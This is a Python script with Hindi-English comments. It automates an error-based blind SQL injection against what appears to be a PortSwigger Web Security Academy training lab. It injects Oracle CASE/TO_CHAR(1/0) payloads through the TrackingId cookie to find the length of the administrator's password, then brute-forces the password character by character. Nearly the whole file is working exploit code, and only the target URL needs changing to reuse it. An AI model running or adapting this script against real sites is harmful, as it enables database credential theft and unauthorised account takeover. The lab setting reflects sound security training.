import requests
import string

# ==================== TARGET CONFIGURATION ====================
# Har nayi lab mein sirf ye 3 cheezein change karni hain:
TARGET_URL = "https://0a6a006603076c9280f8805700d90037.web-security-academy.net/filter?category=Lifestyle"
TRACKING_ID = "QzsSKxWQ5N4xCRpz"

# Note: Agar session token zaroori hai toh yahan daalein, warna khali chhod sakte hain
SESSION_ID = "" 
# ==============================================================

# Brute-force karne ke liye characters (a-z, 0-9)
CHARACTERS = string.ascii_lowercase + string.digits 

def send_request(payload):
    """Database ko request bhej kar check karta hai ki status 500 aaya ya nahi"""
    # Cookie ka structure exact wahi hai jo humne Repeater mein test kiya tha
    cookie_value = f"{TRACKING_ID}' || {payload} || '"
    
    cookies = {"TrackingId": cookie_value}
    if SESSION_ID:
        cookies["session"] = SESSION_ID

    try:
        # Lab server ko crash hone se bachane ke liye timeout set kiya hai
        response = requests.get(TARGET_URL, cookies=cookies, timeout=10)
        
        # Agar status code 500 (Internal Server Error) hai, toh condition TRUE hai
        if response.status_code == 500:
            return True
            
    except requests.RequestException as e:
        print(f"\n[!] Connection Error: {e}")
    return False

def find_password_length():
    """Step 1: Password ki sahi length pata karna"""
    print("[*] Finding password length...")
    for length in range(1, 31): # 1 se 30 tak check karega
        payload = f"(SELECT CASE WHEN (LENGTH(password)={length}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')"
        if send_request(payload):
            print(f"[+] Found! Password length is: {length}\n")
            return length
    print("[-] Could not determine password length.")
    return 0

def extract_password(password_length):
    """Step 2: Ek-ek character brute-force karke password nikalna"""
    print("[*] Extracting password character by character...")
    extracted_password = ""
    
    # Har ek position ke liye (1 se lekar password_length tak)
    for position in range(1, password_length + 1):
        found_char = False
        
        # Har ek possible character ko check karo (a-z, 0-9)
        for char in CHARACTERS:
            # Oracle mein SUBSTRING ki jagah SUBSTR ka use hota hai
            payload = f"(SELECT CASE WHEN (SUBSTR(password,{position},1)='{char}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')"
            
            if send_request(payload):
                extracted_password += char
                print(f"[+] Position {position}: {char} -> Current Password: {extracted_password}")
                found_char = True
                break # Sahi akshar milte hi loop break karo aur अगली position par jao
                
        if not found_char:
            print(f"[-] Position {position}: Character not found!")
            extracted_password += "?" # Agar koi character match na ho

    print(f"\n🎉 Success! Final Administrator Password: {extracted_password}")

if __name__ == "__main__":
    # Sabse pehle length dhoondo
    pwd_length = find_password_length()
    
    # Agar length mil gayi, toh brute force shuru karo
    if pwd_length > 0:
        extract_password(pwd_length)
        
    # Window ko turant close hone se rokne ke liye pause
    input("\n[+] Press ENTER to close window...")